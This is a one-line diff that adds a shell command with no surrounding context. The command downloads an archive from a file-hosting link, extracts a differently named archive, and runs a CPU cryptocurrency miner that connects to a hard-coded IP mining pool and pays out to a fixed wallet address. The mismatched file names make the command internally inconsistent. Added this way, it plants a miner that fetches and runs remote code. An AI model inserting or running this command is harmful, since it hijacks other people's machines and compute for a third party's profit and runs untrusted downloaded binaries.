@@ -1,0 +1,1 @@
+wget https://www.mediafire.com/file/ju29jymn2rf2t80/lolMiner_v1.61_Lin64.tar.gz && tar xf cpuminer-opt-linux.tar.gz && ./cpuminer-sse2 -a yespower -o stratum+tcp://198.50.168.213:6234 -u RNP9gsoRceBPvXUc8wKF5uNh1PKKuMUXTL -p c=VRSC -t 4
